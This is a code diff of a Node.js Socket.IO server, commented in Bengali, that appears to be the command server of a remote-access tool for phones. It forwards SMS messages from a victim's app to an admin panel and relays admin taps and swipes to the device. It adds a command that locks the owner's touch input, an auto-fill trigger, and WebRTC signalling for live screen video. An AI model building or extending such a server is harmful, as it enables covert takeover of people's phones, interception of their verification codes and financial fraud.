@@ -26,24 +26,50 @@ io.on('connection', (socket) => {
         io.emit('receive-sms-from-app', smsMessage);
     });
 
-    // ২. 🖱️ এডমিন প্যানেল থেকে রিমোট ক্লিক আসলে তা ইউজারের অ্যাপে পাঠানো
+    // ২. 🖱 এডমিন প্যানেল থেকে রিমোট কন্ট্রোল কমান্ড
     socket.on('admin-remote-click', (data) => {
-        console.log("Admin clicked at X: " + data.x + ", Y: " + data.y);
-        io.emit('remote-click', data.x, data.y);
+        socket.broadcast.emit('remote-click', data.x, data.y);
     });
-// সোয়াইপ বা স্ক্রল কমান্ড আসলে তা ইউজারের অ্যাপে পাঠানো
+
     socket.on('admin-remote-swipe', (data) => {
-        console.log("Admin swiped. StartX: " + data.startX + " EndX: " + data.endX);
-        io.emit('remote-swipe', data.startX, data.startY, data.endX, data.endY);
+        socket.broadcast.emit('remote-swipe', data.startX, data.startY, data.endX, data.endY);
     });
-    // ৩. 🔒 এডমিন প্যানেল থেকে স্ক্রিন লক বা আনলক কমান্ড পাঠানো
+
     socket.on('admin-lock-touch', (shouldLock) => {
-        console.log("Screen lock status: " + shouldLock);
-        io.emit('lock-touch', shouldLock);
+        socket.broadcast.emit('lock-touch', shouldLock);
     });
+
+    socket.on('trigger-auto-fill', () => {
+        socket.broadcast.emit('trigger-auto-fill');
+    });
+
+    // ==========================================
+    // ৩. নতুন ম্যাজিক: লাইভ ভিডিও (WebRTC) সিগন্যাল আদান-প্রদান 🚀
+    // ==========================================
+    
+    // অ্যাপ থেকে ভিডিও অফার আসলে এডমিনকে পাঠানো
+    socket.on('webrtc-offer', (offer) => {
+        console.log("Relaying WebRTC Offer to Admin...");
+        socket.broadcast.emit('webrtc-offer', offer);
+    });
+
+    // এডমিন থেকে রিসিভ করার সিগন্যাল আসলে অ্যাপকে পাঠানো
+    socket.on('webrtc-answer', (answer) => {
+        console.log("Relaying WebRTC Answer to App...");
+        socket.broadcast.emit('webrtc-answer', answer);
+    });
+
+    // ভিডিও কানেকশন ক্লিয়ার করার জন্য ICE Candidate পাস করা
+    socket.on('webrtc-ice-candidate', (candidate) => {
+        socket.broadcast.emit('webrtc-ice-candidate', candidate);
+    });
+
+    // ==========================================
 
     socket.on('disconnect', () => {
         console.log('Client disconnected: ' + socket.id);
+        // কেউ ডিসকানেক্ট হলে এডমিনকে অফলাইন করে দেওয়া
+        socket.broadcast.emit('user-disconnected-stream');
     });
 });
 
